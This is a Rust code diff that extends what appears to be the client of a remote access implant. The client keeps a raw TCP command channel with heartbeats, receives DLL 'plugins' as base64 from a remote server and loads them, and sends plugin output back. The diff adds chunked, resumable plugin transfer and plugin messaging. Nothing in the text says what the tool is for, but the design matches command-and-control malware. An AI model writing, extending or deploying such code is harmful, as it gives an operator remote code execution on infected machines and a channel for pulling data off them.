@@ -77,6 +77,11 @@ fn session(stream: &mut TcpStream, ip: &str, port: u16, fp: &str, host: &str, pl
     let mut reader = BufReader::new(clone);
 
     loop {
+        for output in plugins.drain_outputs() {
+            let event = output.event.replace(':', "_").replace('\n', "_");
+            let payload = decode_or_empty(output.payload);
+            let _ = send(stream, &format!("{}{}:{}", text::PLUGOUT, event, encode_b64(&payload)));
+        }
         match line(&mut reader) {
             Ok(Some(value)) if value == text::HB => {
                 let _ = send(stream, text::PONG);
@@ -88,34 +93,83 @@ fn session(stream: &mut TcpStream, ip: &str, port: u16, fp: &str, host: &str, pl
             Ok(Some(value)) if value.starts_with(text::CMD) => {
                 let raw = value[text::CMD.len()..].trim();
 
-                // CMD:PLUGIN:<id>:<base64-dll-bytes>
+                // Legacy one-shot plugin load remains supported for compatibility.
                 if starts_with_ascii_ci(raw, text::PLUGIN) {
                     let rest = raw[text::PLUGIN.len()..].trim();
-                    // id is up to first ':'
                     let (id, b64) = match rest.split_once(':') {
                         Some((i, b)) => (i.trim(), b.trim()),
-                        None => {
-                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
-                            continue;
-                        }
+                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); continue; }
                     };
-                    if id.is_empty() || b64.is_empty() {
-                        let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
-                        continue;
-                    }
+                    if id.is_empty() || b64.is_empty() { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); continue; }
                     match decode_b64(b64) {
-                        Some(dll_bytes) => match plugins.load(id, &dll_bytes, host.as_bytes()) {
-                            Ok(()) => {
-                                let _ = send(stream, &format!("{}{}{}", text::ACK, text::PLUGIN, id));
-                            }
-                            Err(_) => {
-                                let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
-                            }
+                        Some(bytes) => match plugins.load(id, &bytes, host.as_bytes()) {
+                            Ok(()) => { let _ = send(stream, &format!("{}{}{}", text::ACK, text::PLUGIN, id)); }
+                            Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); }
                         },
-                        None => {
-                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
-                        }
+                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); }
                     }
+                    continue;
+                }
+
+                if starts_with_ascii_ci(raw, text::PBEGIN) {
+                    let parts: Vec<&str> = raw[text::PBEGIN.len()..].trim().splitn(4, ':').collect();
+                    if parts.len() != 4 { let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); continue; }
+                    let plugin_id = parts[0].trim();
+                    let transfer_id = parts[1].trim();
+                    let size = match parts[2].trim().parse::<u64>() { Ok(v) => v, Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); continue; } };
+                    let hash = parts[3].trim();
+                    if plugin_id.is_empty() || transfer_id.is_empty() || size == 0 || !is_hex64(hash) || size > 256 * 1024 * 1024 {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); continue;
+                    }
+                    match plugins.begin_transfer(plugin_id, transfer_id, size, hash) {
+                        Ok(next) => { let _ = send(stream, &format!("{}{}{}:{}", text::ACK, text::PBEGIN, transfer_id, next)); }
+                        Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); }
+                    }
+                    continue;
+                }
+
+                if starts_with_ascii_ci(raw, text::PRESUME) {
+                    let transfer_id = raw[text::PRESUME.len()..].trim();
+                    match plugins.resume_transfer(transfer_id) {
+                        Some(next) => { let _ = send(stream, &format!("{}{}{}:{}", text::ACK, text::PRESUME, transfer_id, next)); }
+                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::PRESUME)); }
+                    }
+                    continue;
+                }
+
+                if starts_with_ascii_ci(raw, text::PCHUNK) {
+                    let parts: Vec<&str> = raw[text::PCHUNK.len()..].trim().splitn(3, ':').collect();
+                    if parts.len() != 3 { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); continue; }
+                    let transfer_id = parts[0].trim();
+                    let offset = match parts[1].trim().parse::<u64>() { Ok(v) => v, Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); continue; } };
+                    let bytes = match update::decode_base64(parts[2].trim()) { Some(v) if !v.is_empty() && v.len() <= 128 * 1024 => v, _ => { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); continue; } };
+                    match plugins.append_transfer(transfer_id, offset, &bytes) {
+                        Ok(next) => { let _ = send(stream, &format!("{}{}{}:{}", text::ACK, text::PCHUNK, transfer_id, next)); }
+                        Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); }
+                    }
+                    continue;
+                }
+
+                if starts_with_ascii_ci(raw, text::PEND) {
+                    let transfer_id = raw[text::PEND.len()..].trim();
+                    match plugins.finish_transfer(transfer_id, host.as_bytes()) {
+                        Ok(id) => { let _ = send(stream, &format!("{}{}{}", text::ACK, text::PEND, id)); }
+                        Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PEND)); }
+                    }
+                    continue;
+                }
+
+                if starts_with_ascii_ci(raw, text::PMSG) {
+                    let rest = raw[text::PMSG.len()..].trim();
+                    let (plugin_id, encoded) = match rest.split_once(':') { Some(v) => v, None => { let _=send(stream, &format!("{}{}",text::ERR,text::PMSG)); continue; } };
+                    if plugin_id.trim().is_empty() { let _=send(stream,&format!("{}{}",text::ERR,text::PMSG)); continue; }
+                    let payload = match update::decode_base64(encoded.trim()) { Some(v) => v, None => { let _=send(stream,&format!("{}{}",text::ERR,text::PMSG)); continue; } };
+                    let mut parts = payload.splitn(2, |b| *b == b'\n');
+                    let event_bytes = parts.next().unwrap_or(&[]);
+                    let data = parts.next().unwrap_or(&[]);
+                    let event = match core::str::from_utf8(event_bytes) { Ok(v) if !v.is_empty() => v, _ => { let _=send(stream,&format!("{}{}",text::ERR,text::PMSG)); continue; } };
+                    plugins.event(event, data);
+                    let _ = send(stream, &format!("{}{}{}", text::ACK, text::PMSG, plugin_id.trim()));
                     continue;
                 }
 
@@ -290,6 +344,28 @@ fn decode_b64(s: &str) -> Option<Vec<u8>> {
     }
     Some(out)
 }
+
+fn is_hex64(value: &str) -> bool {
+    value.len() == 64 && value.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f' | b'A'..=b'F'))
+}
+
+fn encode_b64(bytes: &[u8]) -> String {
+    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut out = String::with_capacity(((bytes.len()+2)/3)*4);
+    let mut i=0;
+    while i<bytes.len() {
+        let a=bytes[i] as u32; let b=if i+1<bytes.len(){bytes[i+1] as u32}else{0}; let c=if i+2<bytes.len(){bytes[i+2] as u32}else{0};
+        let n=(a<<16)|(b<<8)|c;
+        out.push(TABLE[((n>>18)&63) as usize] as char);
+        out.push(TABLE[((n>>12)&63) as usize] as char);
+        out.push(if i+1<bytes.len(){TABLE[((n>>6)&63) as usize] as char}else{'='});
+        out.push(if i+2<bytes.len(){TABLE[(n&63) as usize] as char}else{'='});
+        i+=3;
+    }
+    out
+}
+
+fn decode_or_empty(bytes: Vec<u8>) -> Vec<u8> { bytes }
 
 fn line(r: &mut BufReader<TcpStream>) -> std::io::Result<Option<String>> {
     let mut s = String::new();
